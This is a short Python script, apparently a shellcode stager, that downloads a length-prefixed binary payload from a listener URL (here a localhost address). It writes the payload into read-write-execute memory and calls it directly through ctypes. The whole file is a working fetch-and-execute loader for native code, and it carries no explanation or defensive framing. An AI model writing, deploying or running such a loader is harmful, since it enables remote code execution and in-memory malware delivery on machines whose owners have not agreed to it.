import ctypes
import mmap
import urllib.request
import struct

URL="http://127.0.0.1:8001/listener"

with urllib.request.urlopen(URL) as url:
    data = url.read()

payload_len, = struct.unpack('<I', data[0:4])
payload = data[4:]

num_of_pages = int(payload_len / mmap.PAGESIZE) + 1

mem = mmap.mmap(
    -1,
    mmap.PAGESIZE*num_of_pages,
    mmap.MAP_SHARED,
    mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
)
mem.write(payload)

addr = int.from_bytes(ctypes.string_at(id(mem) + 16, 8), "little")
functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
fn = functype(addr)
fn()
